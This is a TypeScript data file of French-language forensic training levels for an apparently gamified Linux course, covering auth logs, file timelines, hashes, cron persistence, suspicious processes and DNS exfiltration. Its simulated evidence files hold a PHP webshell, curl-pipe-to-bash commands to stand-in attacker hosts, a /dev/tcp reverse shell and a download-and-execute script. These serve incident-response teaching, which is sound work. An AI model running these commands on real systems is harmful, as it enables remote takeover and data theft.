import type { Level } from './_types';

export const levels51_60: Level[] = [
  {
    id: 51,
    title: "Analyse de logs auth",
    difficulty: 'advanced',
    category: "Forensic",
    objective: "Extraire les connexions suspectes d'auth.log",
    description: "`/var/log/auth.log` enregistre toutes les tentatives d'authentification. Utilise `grep`, `cut`, `sort`, `uniq -c` pour identifier des IP qui tentent de se connecter en masse.",
    commands: ['grep', 'cut', 'sort', 'uniq'],
    hints: [
      "`cat auth.log | grep 'Failed password'` — toutes les tentatives échouées.",
      "`grep 'Failed' auth.log | grep -oE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+'` — extraire les IPs.",
      "Pipe vers `sort | uniq -c | sort -rn` pour compter par IP."
    ],
    fileSystem: {
      'auth.log': `Jan 15 02:10:01 server sshd[1234]: Failed password for root from 45.33.32.156 port 47621 ssh2
Jan 15 02:10:02 server sshd[1234]: Failed password for root from 45.33.32.156 port 47622 ssh2
Jan 15 02:10:03 server sshd[1234]: Failed password for admin from 45.33.32.156 port 47623 ssh2
Jan 15 02:10:04 server sshd[1234]: Failed password for root from 45.33.32.156 port 47624 ssh2
Jan 15 02:10:05 server sshd[1235]: Accepted password for student from 192.168.1.50 port 54321 ssh2
Jan 15 02:10:15 server sshd[1234]: Failed password for root from 103.99.0.122 port 51234 ssh2
Jan 15 02:10:16 server sshd[1234]: Failed password for root from 103.99.0.122 port 51235 ssh2
Jan 15 02:11:00 server sshd[1234]: Failed password for root from 45.33.32.156 port 47700 ssh2
Jan 15 02:15:00 server sudo[2345]: student : TTY=pts/0 ; PWD=/home/student ; USER=root ; COMMAND=/bin/cat /etc/shadow`
    },
    validation: [
      { type: 'command', value: 'grep Failed', description: 'Filtrer les tentatives échouées' },
      { type: 'command', value: 'sort', description: 'Trier et dénombrer les IPs suspectes' }
    ],
    story: "🚨 Le SOC a détecté une activité anormale sur SSH cette nuit. Analyse le fichier auth.log pour identifier l'IP la plus agressive."
  },
  {
    id: 52,
    title: "Timeline de fichiers",
    difficulty: 'advanced',
    category: "Forensic",
    objective: "Observer les dates de modification avec stat et find -newer",
    description: "`stat fichier` affiche les 3 timestamps : `atime` (accès), `mtime` (modification), `ctime` (changement de métadonnées). `find . -newer fichier_ref` liste les fichiers modifiés après une référence.",
    commands: ['stat', 'find', 'ls'],
    hints: [
      "`stat suspect.php` — voir exactement quand ce fichier a été modifié.",
      "`ls -lt` — liste triée par date (plus récent en premier).",
      "`find /var/www -newer /tmp/reference -name '*.php'` — PHP modifiés récemment."
    ],
    fileSystem: {
      'var': {
        'www': {
          'html': {
            'index.php': '<?php echo "Site normal"; ?>',
            'contact.php': '<?php echo "Contact"; ?>',
            'upload.php': '<?php system($_GET["cmd"]); ?> // WEBSHELL SUSPECT',
            'style.css': 'body { margin: 0; }'
          }
        }
      }
    },
    validation: [
      { type: 'command', value: 'stat', description: 'Afficher les timestamps d\'un fichier' },
      { type: 'command', value: 'find', description: 'Trouver les fichiers modifiés récemment' }
    ],
    story: "🕵️ Le site web a été compromis. Un fichier malveillant a été déposé récemment. Établis une timeline et trouve-le."
  },
  {
    id: 53,
    title: "Intégrité par hash",
    difficulty: 'advanced',
    category: "Forensic",
    objective: "Vérifier l'intégrité de fichiers avec sha256sum",
    description: "En forensic, on compare les **hashes** de fichiers suspects à des références connues. `sha256sum fichier` calcule l'empreinte. `sha256sum -c checksums.txt` compare un lot de fichiers.",
    commands: ['sha256sum', 'md5'],
    hints: [
      "`sha256sum malware.bin` — calcule l'empreinte SHA256.",
      "Compare à la base IOC dans `known_hashes.txt`.",
      "Si les empreintes correspondent au fichier de référence : potentiellement malveillant (hash connu)."
    ],
    fileSystem: {
      'known_hashes.txt': `# Hashes de malwares connus (fictifs pour l'exercice)
aabbcc1234567890aabbcc1234567890aabbcc1234567890aabbcc1234567890  mimikatz.exe
deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef  ransomware.bin
5d41402abc4b2a76b9719d911017c592  test_benignes.txt`,
      'malware.bin': '[BINAIRE SUSPECT — calcule son hash et compare]',
      'info.txt': 'Calcule le hash SHA256 de malware.bin puis compare au fichier known_hashes.txt'
    },
    validation: [
      { type: 'command', value: 'sha256sum', description: 'Calculer l\'empreinte SHA256 d\'un fichier suspect' }
    ],
    story: "🔬 Un fichier suspect a été récupéré sur le serveur compromis. Vérifie son intégrité en le comparant à une base de hashes connus."
  },
  {
    id: 54,
    title: "Persistance via cron",
    difficulty: 'advanced',
    category: "Forensic",
    objective: "Détecter une persistance malveillante dans crontab",
    description: "Les attaquants utilisent souvent `crontab` pour maintenir un accès même après reboot. Vérifie : `crontab -l`, `/etc/cron.d/`, `/etc/cron.daily/`, `/var/spool/cron/`.",
    commands: ['crontab', 'cat', 'ls'],
    hints: [
      "`crontab -l` — tâches de l'utilisateur courant.",
      "`cat /etc/cron.d/backdoor` — un fichier suspect y a peut-être été déposé.",
      "Repère les commandes qui téléchargent ou exécutent des scripts depuis Internet."
    ],
    fileSystem: {
      'etc': {
        'cron.d': {
          'system-update': '0 3 * * * root /usr/bin/apt-get update -y',
          'monitoring': '*/5 * * * * root /usr/local/bin/monitor.sh',
          'backdoor': '* * * * * root curl http://attacker.com/rev.sh | bash'
        }
      }
    },
    validation: [
      { type: 'command', value: 'cat /etc/cron.d', description: 'Inspecter les tâches cron système' }
    ],
    story: "🦠 Même après réinstallation, l'attaquant revient. Un mécanisme de persistance subsiste quelque part dans les crons système."
  },
  {
    id: 55,
    title: "Processus suspects",
    difficulty: 'advanced',
    category: "Forensic",
    objective: "Identifier un processus anormal avec ps et lsof",
    description: "`ps aux` liste tous les processus. `lsof -p PID` (list open files) montre les fichiers/connexions ouverts par un processus. Ensemble : identifier un processus et ses activités réseau ou fichiers suspects.",
    commands: ['ps', 'lsof'],
    hints: [
      "`ps aux | grep -v '^USER'` — tous les processus sauf l'en-tête.",
      "`ps aux | sort -k3 -rn | head` — top CPU.",
      "`lsof -p 1337` — fichiers et connexions du processus PID 1337."
    ],
    fileSystem: {
      'process_analysis.txt': `Analyse des processus suspects :

  PID  USER      %CPU  COMMAND
  1337 www-data  98.2  /tmp/.svc -c http://185.220.101.5:8080
  1338 www-data   0.0  /bin/bash -i >& /dev/tcp/185.220.101.5/4444 0>&1

Indicateurs d'alerte :
  - Processus dans /tmp (pas un répertoire légitime pour des binaires)
  - Connexion réseau depuis un shell (bash avec /dev/tcp)
  - CPU très élevé pour un service web`,
    },
    validation: [
      { type: 'command', value: 'ps aux', description: 'Lister tous les processus' },
      { type: 'command', value: 'lsof', description: 'Inspecter les fichiers ouverts d\'un processus' }
    ],
    story: "🔎 Un processus inconnu tourne sur le serveur et consomme du CPU. Identifie-le et vois à quoi il se connecte."
  },
  {
    id: 56,
    title: "Utilisateurs connectés",
    difficulty: 'intermediate',
    category: "Forensic",
    objective: "Voir les sessions actives et l'historique avec who et last",
    description: "`who` affiche les utilisateurs connectés en ce moment. `last` affiche l'historique des connexions (source du fichier `wtmp`). `lastb` montre les tentatives échouées (`btmp`).",
    commands: ['who', 'last'],
    hints: [
      "`who` — sessions SSH actives actuellement.",
      "`last | head -20` — 20 dernières connexions réussies.",
      "`last | grep 'still logged'` — sessions encore actives."
    ],
    fileSystem: {
      'sessions_suspicious.txt': `Historique extrait (last) :
  admin    pts/1  185.220.101.5  Wed Jan 15 03:14   still logged in ← SUSPECT
  student  pts/0  192.168.1.10   Wed Jan 15 09:00 - 17:00
  root     pts/2  10.10.10.1     Tue Jan 14 22:00 - 22:30

Session suspecte :
  - Heure : 03h14 (hors heures normales)
  - IP source : 185.220.101.5 (pas un réseau interne)
  - Toujours connecté → session active à investiguer`
    },
    validation: [
      { type: 'command', value: 'who', description: 'Afficher les utilisateurs connectés' },
      { type: 'command', value: 'last', description: 'Historique des connexions' }
    ],
    story: "👥 Quelqu'un s'est connecté au serveur hier soir à 3h depuis une IP inhabituelle. Retrouve-le dans l'historique."
  },
  {
    id: 57,
    title: "Fichiers cachés et attributs",
    difficulty: 'advanced',
    category: "Forensic",
    objective: "Trouver des fichiers cachés et lire leurs attributs avec lsattr",
    description: "`ls -la` révèle les fichiers commençant par `.` (cachés). `lsattr fichier` affiche les attributs étendus Linux (ex. `i` = immutable, empêche la suppression même par root).",
    commands: ['ls', 'lsattr'],
    hints: [
      "`ls -la` — les fichiers `.nomfichier` sont cachés par `ls` normal.",
      "`lsattr .hidden_script` — attribut `i` = immutable (méthode d'évasion).",
      "Cherche dans `/tmp`, `/dev/shm`, `/var/tmp` — répertoires souvent utilisés."
    ],
    fileSystem: {
      '.hidden_script': '#!/bin/bash\ncurl http://c2.attacker.com/payload | bash',
      '.env_backup': 'DB_PASSWORD=super_secret_prod\nAPI_KEY=sk-prod-xxxxx',
      'README.txt': 'Fichiers normaux uniquement visibles ici...',
      'tmp': {
        '.c2_agent': '[BINAIRE — agent C2 caché dans /tmp]'
      }
    },
    validation: [
      { type: 'command', value: 'ls -la', description: 'Lister y compris les fichiers cachés' },
      { type: 'command', value: 'lsattr', description: 'Afficher les attributs étendus' }
    ],
    story: "🙈 L'arborescence semble propre... mais l'attaquant est patient. Cherche ce qui se cache."
  },
  {
    id: 58,
    title: "Analyse de trafic DNS",
    difficulty: 'advanced',
    category: "Forensic",
    objective: "Détecter une exfiltration via DNS dans des logs",
    description: "L'exfiltration DNS encode des données dans des requêtes DNS (`data.c2domain.com`). Dans les logs, cela se manifeste par des sous-domaines longs et aléatoires vers un même domaine racine.",
    commands: ['grep', 'cut', 'sort', 'uniq'],
    hints: [
      "`cat dns.log | grep -v 'google\\|cloudflare'` — filtrer les résolveurs légitimes.",
      "`awk '{print $5}' dns.log | cut -d. -f2-` — extraire les domaines racines.",
      "Un domaine qui reçoit des centaines de requêtes avec des sous-domaines longs = suspect."
    ],
    fileSystem: {
      'dns.log': `2024-01-15 14:00:01 192.168.1.50 > 8.8.8.8 A google.com
2024-01-15 14:00:02 192.168.1.50 > 8.8.8.8 A github.com
2024-01-15 14:01:00 192.168.1.50 > 8.8.8.8 A aGVsbG8td29ybGQ.c2exfil.xyz
2024-01-15 14:01:01 192.168.1.50 > 8.8.8.8 A dGhpcyBpcy1zZWNy.c2exfil.xyz
2024-01-15 14:01:02 192.168.1.50 > 8.8.8.8 A ZXQtZGF0YS5mb3I.c2exfil.xyz
2024-01-15 14:01:03 192.168.1.50 > 8.8.8.8 A YXR0YWNrZXItb25s.c2exfil.xyz
2024-01-15 14:02:00 192.168.1.50 > 8.8.8.8 A stackoverflow.com
2024-01-15 14:03:00 192.168.1.50 > 8.8.8.8 A eW91LWZvdW5kLWl0.c2exfil.xyz`
    },
    validation: [
      { type: 'command', value: 'grep c2exfil', description: 'Isoler les requêtes vers le domaine suspect' }
    ],
    story: "📡 Des données confidentielles quittent le réseau... mais le pare-feu ne bloque que le port 443. Analyse les logs DNS pour détecter l'exfiltration."
  },
  {
    id: 59,
    title: "Script de collecte forensic",
    difficulty: 'advanced',
    category: "Forensic",
    objective: "Créer un script bash de triage initial",
    description: "En réponse à incident, on collecte rapidement : date, hostname, utilisateurs connectés, processus, connexions réseau, tâches cron. Un script bash automatise ce **triage initial** (ou *live response*).",
    commands: ['echo', 'chmod', 'who', 'ps', 'ss'],
    hints: [
      "⚠️ Utilise toujours des guillemets simples : `echo '#!/bin/bash' > triage.sh` (sans guillemets, le `#` est un commentaire bash).",
      "Ajoute des commandes : `who >> triage.sh`, `ps aux >> triage.sh`, `ss -tulnp >> triage.sh`.",
      "Rends-le exécutable : `chmod +x triage.sh`, puis exécute : `./triage.sh`."
    ],
    fileSystem: {
      'triage_template.sh': `#!/bin/bash
# Template de triage forensic — à compléter

echo "=== DATE ===" >> rapport.txt
date >> rapport.txt

echo "=== HOSTNAME ===" >> rapport.txt
hostname >> rapport.txt

# Ajoute ici : who, ps aux, ss -tulnp, crontab -l, etc.
`,
      'triage_checklist.txt': `Checklist triage initial (live response) :
  [x] Date/heure système (décalage NTP ?)
  [x] Hostname et IP
  [ ] Utilisateurs connectés (who, last)
  [ ] Processus actifs (ps aux)
  [ ] Connexions réseau (ss -tulnp)
  [ ] Tâches cron (crontab -l, /etc/cron.d/)
  [ ] Fichiers récemment modifiés (find / -mtime -1)
  [ ] Modules kernel chargés (lsmod)`
    },
    validation: [
      { type: 'command', value: 'echo >', description: 'Créer triage.sh avec echo et redirection (echo ... > triage.sh)' },
      { type: 'command', value: './triage.sh', description: 'Exécuter le script de collecte' }
    ],
    story: "⚡ L'incident vient d'être détecté. Tu as 5 minutes avant que l'équipe de gestion arrive. Collecte les preuves volatiles maintenant."
  },
  {
    id: 60,
    title: "Mission : Réponse à incident complète",
    difficulty: 'advanced',
    category: "Forensic",
    objective: "Enchaîner toutes les techniques pour reconstruire un incident",
    description: "Mission finale de la section forensic. Tu disposes d'un système post-compromission. Reconstruis **qui, quand, comment** : logs d'auth, processus, crons, fichiers suspects, connexions réseau. Documente tes findings.",
    commands: ['grep', 'cat', 'ps', 'ss', 'find', 'stat', 'sha256sum', 'last'],
    hints: [
      "1. `last` — qui s'est connecté ?",
      "2. `cat auth.log | grep Failed` — tentatives de brute-force ?",
      "3. `ps aux` — processus suspect ?",
      "4. `ss -tulnp` — port inhabituel ?",
      "5. `find / -newer /tmp/ref -name '*.sh' 2>/dev/null` — fichiers déposés récemment ?"
    ],
    fileSystem: {
      'auth.log': `Jan 15 01:00:00 server sshd: Failed password for root from 185.220.101.5 port 12345 ssh2
Jan 15 01:00:01 server sshd: Failed password for root from 185.220.101.5 port 12346 ssh2
Jan 15 01:00:02 server sshd: Failed password for root from 185.220.101.5 port 12347 ssh2
Jan 15 01:00:45 server sshd: Accepted password for admin from 185.220.101.5 port 12400 ssh2
Jan 15 01:01:00 server sudo: admin : COMMAND=/bin/bash`,
      'suspect.sh': '#!/bin/bash\ncurl http://185.220.101.5/payload -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x &',
      'cron.txt': '* * * * * root /tmp/.x'
    },
    validation: [
      { type: 'command', value: 'cat auth.log', description: 'Lire les logs d\'authentification' },
      { type: 'command', value: 'cat suspect.sh', description: 'Examiner le script malveillant' },
      { type: 'command', value: 'grep Failed', description: 'Identifier l\'IP source de l\'attaque' }
    ],
    story: "🏆 MISSION FORENSIC FINALE : Un serveur de production a été compromis hier soir. Tu es la première personne arrivée. Les preuves sont volatiles. Reconstitue la chaîne d'attaque avant toute chose."
  },
];
